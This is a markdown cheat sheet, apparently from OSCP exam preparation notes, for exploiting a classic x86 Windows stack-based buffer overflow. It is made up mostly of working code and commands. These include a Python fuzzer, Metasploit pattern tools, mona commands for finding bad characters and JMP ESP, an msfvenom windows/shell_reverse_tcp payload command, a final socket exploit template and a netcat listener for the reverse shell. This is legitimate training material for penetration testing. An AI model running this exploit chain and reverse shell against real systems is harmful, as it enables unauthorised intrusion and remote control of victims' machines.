# Buffer Overflow — [Back to Main](../README.md)

Classic x86 Windows stack-based BOF — the OSCP-style manual approach.
Assumes Immunity Debugger + mona.py on the target Windows VM.

---

## Setup

```bash
# LHOST: set target
export IP=<target_ip>
export PORT=<vulnerable_port>

# In Immunity Debugger on target — set mona working dir
# !mona config -set workingfolder C:\mona\%p
```

---

## Step 1 — Fuzzing (Find Crash Length)

```python
#!/usr/bin/env python3
# fuzzer.py
import socket, sys, time

PREFIX = b""       # any required prefix for the protocol (e.g. b"OVERFLOW1 ")
SUFFIX = b""       # any required suffix

buf = b"A" * 100
while True:
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((sys.argv[1], int(sys.argv[2])))
        s.recv(1024)
        print(f"[*] Sending {len(buf)} bytes")
        s.send(PREFIX + buf + SUFFIX)
        s.recv(1024)
        s.close()
        buf += b"A" * 100
        time.sleep(0.5)
    except Exception as e:
        print(f"[!] Crashed at ~{len(buf)} bytes")
        sys.exit()
```

```bash
python3 fuzzer.py $IP $PORT
# Note approximate crash length
```

---

## Step 2 — Find Exact EIP Offset

```bash
# Generate unique pattern (use crash length + 400 buffer)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_length>
```

Send the pattern instead of A's. Observe EIP value in Immunity when it crashes.

```bash
# Find offset from EIP value
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>
# Or in Immunity: !mona findmsp -distance <crash_length>
```

---

## Step 3 — Confirm EIP Control

```python
#!/usr/bin/env python3
# exploit.py — template, update each step
import socket

IP = "<target>"
PORT = <port>
PREFIX = b""
SUFFIX = b""
OFFSET = <exact_offset>
RETN = b"BBBB"       # EIP should = 42424242
PADDING = b""
PAYLOAD = b""

buf = PREFIX + b"A" * OFFSET + RETN + PADDING + PAYLOAD + SUFFIX
s = socket.socket()
s.connect((IP, PORT))
s.recv(1024)
s.send(buf)
```

EIP = `42424242` → offset is correct.

---

## Step 4 — Bad Characters

```bash
# Generate bytearray in Immunity (exclude \x00 always):
# !mona bytearray -b "\x00"
```

```python
# Generate all bytes \x01-\xff (excluding known bad chars as you find them)
BADCHARS = b"\x01\x02\x03..."   # all chars except \x00
PAYLOAD = BADCHARS
```

Send and observe ESP dump in Immunity:

```bash
# Compare ESP memory to bytearray file — highlights bad chars
# !mona compare -f C:\mona\<app>\bytearray.bin -a <ESP_address>
```

Remove each bad char found, regenerate bytearray and payload, repeat until `Unmodified`.

---

## Step 5 — Find JMP ESP

```bash
# In Immunity — find JMP ESP in modules without ASLR/DEP/SafeSEH
# !mona jmp -r esp -cpb "\x00\x0a"    # add ALL bad chars to -cpb

# Note address (e.g. 0x625011AF) → convert to little endian
# 0x625011AF → \xAF\x11\x50\x62
```

---

## Step 6 — Generate Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  EXITFUNC=thread \
  -b "\x00\x0a"          \    # add ALL bad chars here
  -f python -v PAYLOAD
```

---

## Step 7 — Final Exploit

```python
#!/usr/bin/env python3
import socket

IP = "<target>"
PORT = <port>
PREFIX = b""
SUFFIX = b""
OFFSET = <exact_offset>
RETN = b"\xAF\x11\x50\x62"   # JMP ESP address — little endian
PADDING = b"\x90" * 16        # NOP sled (gives shellcode room to land)

PAYLOAD = b""   # paste msfvenom output here

buf = PREFIX + b"A" * OFFSET + RETN + PADDING + PAYLOAD + SUFFIX

s = socket.socket()
s.connect((IP, PORT))
s.recv(1024)
s.send(buf)
```

```bash
# Start listener before running
rlwrap nc -lvnp $LPORT
python3 exploit.py
```

---

## Tips

- If crash is inconsistent: add `time.sleep(1)` between connection attempts.
- If shellcode doesn't execute: increase NOP sled to 32+ bytes.
- `EXITFUNC=thread` prevents the service from crashing after shell exits.
- Always test the final exploit in Immunity first, then against the real target.
- If `!mona jmp` returns nothing: try `!mona find -s "\xff\xe4" -type raw` or look in the application's own DLLs.
